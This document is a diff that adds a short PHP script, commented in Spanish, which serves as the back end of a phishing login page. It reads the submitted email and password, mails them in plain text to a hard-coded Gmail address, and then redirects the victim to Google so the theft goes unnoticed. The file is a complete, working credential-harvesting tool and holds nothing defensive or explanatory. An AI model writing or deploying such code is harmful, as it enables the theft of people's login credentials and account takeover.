@@ -1,0 +1,43 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Obtener los datos del formulario
+    $email = $_POST['email'];
+    $password = $_POST['password'];
+
+    // Dirección de correo electrónico donde se enviarán los datos
+    $to = "jeancarlos2310ian@gmail.com";
+    
+    // Asunto del correo
+    $subject = "Nuevo inicio de sesión";
+
+    // Cuerpo del correo
+    $message = "
+    <html>
+    <head>
+        <title>Nuevo inicio de sesión</title>
+    </head>
+    <body>
+        <h2>Detalles del inicio de sesión</h2>
+        <p><strong>Correo electrónico:</strong> $email</p>
+        <p><strong>Contraseña:</strong> $password</p>
+    </body>
+    </html>
+    ";
+
+    // Cabeceras para el correo (asegurando que sea un correo HTML)
+    $headers = "MIME-Version: 1.0" . "\r\n";
+    $headers .= "Content-Type: text/html; charset=UTF-8" . "\r\n";
+
+    // Enviar el correo
+    if (mail($to, $subject, $message, $headers)) {
+        // Si el correo se envió correctamente, redirige a Google
+        header("Location: https://www.google.com");
+        exit; // Asegura que no se ejecute más código
+    } else {
+        // Si hubo un error al enviar el correo
+        echo "Hubo un error al enviar el correo.";
+    }
+} else {
+    echo "Método no permitido.";
+}
+?>
